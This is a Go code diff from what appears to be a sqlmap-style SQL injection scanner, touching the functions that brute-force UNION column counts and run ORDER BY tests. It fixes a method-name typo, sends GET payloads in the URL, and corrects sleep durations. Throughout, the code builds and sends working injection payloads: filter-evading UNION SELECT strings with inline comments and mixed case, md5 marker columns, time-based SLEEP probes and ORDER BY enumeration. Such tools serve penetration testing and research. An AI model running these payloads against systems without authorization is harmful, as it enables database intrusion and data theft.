@@ -141,9 +141,14 @@ func (sql *Sqlmap) bruteColumnNum(pos int, lineBreak bool, closeType int) int {
 					payload = param.Value + CloseType[closeType] + `/**/UniOn/**/All/**/Select/**/` + strings.Repeat(randStr, i)
 				}
 
-				payload = sql.Variations.SetPayloadByindex(param.Index, sql.Url, strings.TrimRight(payload, ",")+"#", sql.Method)
+				payload = sql.Variations.SetPayloadByIndex(param.Index, sql.Url, strings.TrimRight(payload, ",")+"#", sql.Method)
 
-				res, err := httpx.Request(sql.Url, sql.Method, payload, false, sql.Headers)
+				var res *httpx.Response
+				if sql.Method == "GET" {
+					res, err = httpx.Request(payload, sql.Method, "", false, sql.Headers)
+				} else {
+					res, err = httpx.Request(sql.Url, sql.Method, payload, false, sql.Headers)
+				}
 
 				if err != nil {
 					logging.Logger.Debugf("尝试检测 Union SQL Injection Payload 失败")
@@ -151,7 +156,7 @@ func (sql *Sqlmap) bruteColumnNum(pos int, lineBreak bool, closeType int) int {
 				}
 
 				ratios[i-1] = strsim.Compare(res.Body, sql.TemplateBody)
-				time.Sleep(0.3) // 避免过于频繁请求导致速率被限制进而导致结果偏差
+				time.Sleep(time.Millisecond * 500) // 避免过于频繁请求导致速率被限制进而导致结果偏差
 				continue
 			}
 		}
@@ -220,10 +225,14 @@ func (sql *Sqlmap) bruteColumnNum(pos int, lineBreak bool, closeType int) int {
 					payload = param.Value + CloseType[closeType] + `/**/UniOn/**/All/**/Select/**/` + strings.Repeat(fmt.Sprintf(`md5('%v'),`, md5Randstr), columnNum)
 				}
 
-				payload = sql.Variations.SetPayloadByindex(param.Index, sql.Url, strings.TrimRight(payload, ",")+"#", sql.Method)
+				payload = sql.Variations.SetPayloadByIndex(param.Index, sql.Url, strings.TrimRight(payload, ",")+"#", sql.Method)
 
-				res, err := httpx.Request(sql.Url, sql.Method, payload, false, sql.Headers)
-
+				var res *httpx.Response
+				if sql.Method == "GET" {
+					res, err = httpx.Request(payload, sql.Method, "", false, sql.Headers)
+				} else {
+					res, err = httpx.Request(sql.Url, sql.Method, payload, false, sql.Headers)
+				}
 				if err != nil {
 					continue
 				}
@@ -265,9 +274,14 @@ func (sql *Sqlmap) bruteColumnNum(pos int, lineBreak bool, closeType int) int {
 					payload = param.Value + CloseType[closeType] + `/**/UniOn/**/Select/**/` + strings.Repeat(randStr, i-1)
 				}
 
-				payload += sql.Variations.SetPayloadByindex(param.Index, sql.Url, fmt.Sprintf(`SLeep(%v)#`, standardRespTime*2/1000+3), sql.Method)
+				payload += sql.Variations.SetPayloadByIndex(param.Index, sql.Url, fmt.Sprintf(`SLeep(%v)#`, standardRespTime*2/1000+3), sql.Method)
 
-				res, err := httpx.Request(sql.Url, sql.Method, payload, false, sql.Headers)
+				var res *httpx.Response
+				if sql.Method == "GET" {
+					res, err = httpx.Request(payload, sql.Method, "", false, sql.Headers)
+				} else {
+					res, err = httpx.Request(sql.Url, sql.Method, payload, false, sql.Headers)
+				}
 
 				if err != nil {
 					continue
@@ -294,7 +308,7 @@ func (sql *Sqlmap) bruteColumnNum(pos int, lineBreak bool, closeType int) int {
 					logging.Logger.Debugln("UNION 列数经过UNION BruteForce sleep探测为 ", i)
 					return i
 				} else {
-					time.Sleep(0.5) // 避免过于频繁请求导致结果偏差
+					time.Sleep(time.Millisecond * 500) // 避免过于频繁请求导致结果偏差
 					continue
 				}
 
@@ -318,9 +332,15 @@ func (sql *Sqlmap) orderByTest(number, pos int, lineBreak bool, closeType int, d
 				payload = param.Value + CloseType[closeType] + `/**/ORDeR/**/bY/**/` + strconv.Itoa(number) + "#"
 			}
 
-			payload = sql.Variations.SetPayloadByindex(param.Index, sql.Url, payload, sql.Method)
+			payload = sql.Variations.SetPayloadByIndex(param.Index, sql.Url, payload, sql.Method)
 
-			res, err := httpx.Request(sql.Url, sql.Method, payload, false, sql.Headers)
+			var res *httpx.Response
+			var err error
+			if sql.Method == "GET" {
+				res, err = httpx.Request(payload, sql.Method, "", false, sql.Headers)
+			} else {
+				res, err = httpx.Request(sql.Url, sql.Method, payload, false, sql.Headers)
+			}
 
 			if err != nil {
 				continue
